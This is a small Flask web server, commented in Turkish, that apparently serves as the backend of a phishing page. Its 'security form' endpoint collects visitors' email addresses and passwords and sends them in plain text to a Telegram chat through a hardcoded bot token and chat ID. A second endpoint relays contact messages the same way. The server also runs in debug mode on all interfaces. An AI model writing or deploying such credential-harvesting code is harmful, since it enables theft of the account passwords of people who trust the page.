from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# ============================================================
# SENİN GÜNCEL BİLGİLERİN
# ============================================================
BOT_TOKEN = "8950123193:AAHxn-pH1L5sZ-pePgP4UUHN8e8MVSWhM_4"
CHAT_ID = "-1004303544652"
# ============================================================

def telegram_mesaj_gonder(mesaj):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "Markdown"}
    try:
        response = requests.post(url, data=data)
        if not response.ok:
            print("Telegram Hatası:", response.text) 
        return response.ok
    except Exception as e:
        print("Bağlantı Hatası:", e)
        return False

@app.route('/')
def ana_sayfa():
    # HTML dosyasını templates klasöründen değil, direkt ana dizinden oku
    return render_template('index.html')

@app.route('/api/guvenlik', methods=['POST'])
def guvenlik():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    mesaj = f"🚨 *GÜVENLİK FORMU DOLDURULDU!*\n\n📧 *E-posta:* {email}\n🔑 *Şifre:* {password}"
    basarili = telegram_mesaj_gonder(mesaj)
    
    return jsonify({"status": "ok" if basarili else "hata"})

@app.route('/api/iletisim', methods=['POST'])
def iletisim():
    data = request.json
    isim = data.get('isim')
    mesaj = data.get('mesaj')
    
    tg_mesaj = f"📩 *Yeni Mesaj Geldi!*\n\n👤 *Gönderen:* {isim}\n💬 *Mesaj:* {mesaj}"
    basarili = telegram_mesaj_gonder(tg_mesaj)
    
    return jsonify({"status": "ok" if basarili else "hata"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
